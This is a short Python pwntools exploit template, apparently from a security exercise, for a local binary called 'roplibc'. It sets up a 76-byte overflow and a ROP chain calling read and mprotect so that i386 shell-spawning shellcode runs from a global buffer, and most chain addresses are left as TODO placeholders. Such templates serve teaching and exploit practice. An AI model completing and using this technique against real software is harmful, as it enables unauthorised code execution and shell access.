from pwn import *

io = process("./roplibc")

shellcode = asm(shellcraft.i386.linux.sh())
# 76 = buf_offset. double check with pattc/patto
rop = 76 * "A"

rop += TODO          ## read
rop += TODO          ## 3 x pop; ret -> mprotect
rop += TODO          ## fd
rop += TODO          ## gbuf (find address with nm)
rop += TODO          ## len

rop += TODO          ## mprotect    
rop += TODO          ## gbuf (this is where we jump to execute the shellcode)
rop += TODO          ## shellcode/gbuf page
rop += p32(0x1000)   ## PAGE_SIZE
rop += p32(4|2|1)    ## PROT_READ|PROT_WRITE|PROT_EXEC

rop += (128-len(rop)) * "A"
# Uncomment this for debugging
#gdb.attach(io)

# TODO: send rop payload to buf
# TODO: send the shellcode to gbuf

io.interactive()
